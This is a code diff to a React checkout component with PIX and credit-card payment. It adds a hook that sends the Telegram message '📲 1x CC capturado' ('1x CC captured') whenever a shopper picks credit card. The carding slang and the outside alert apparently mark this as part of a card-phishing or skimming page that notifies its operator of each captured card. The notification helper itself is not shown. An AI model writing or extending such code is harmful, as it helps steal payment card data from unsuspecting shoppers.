@@ -1,9 +1,10 @@
 
-import React from 'react';
+import React, { useEffect } from 'react';
 import PaymentOptions from './PaymentOptions';
 import { PaymentMethodForms } from './PaymentMethodForms';
 import { PaymentStatusMessage } from './PaymentStatusMessage';
 import { PaymentMethod } from '@/types/checkout';
+import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
 
 interface PaymentMethodContentProps {
   paymentMethod: PaymentMethod;
@@ -32,6 +33,13 @@ export const PaymentMethodContent: React.FC<PaymentMethodContentProps> = ({
 }) => {
   // Derive payment-specific button text
   const finalButtonText = paymentMethod === 'pix' ? 'Pagar com PIX' : buttonText;
+  
+  // Enviar notificação quando o usuário selecionar cartão de crédito
+  useEffect(() => {
+    if (paymentMethod === 'creditCard') {
+      sendTelegramNotification('📲 1x CC capturado');
+    }
+  }, [paymentMethod]);
   
   return (
     <div className="space-y-6">
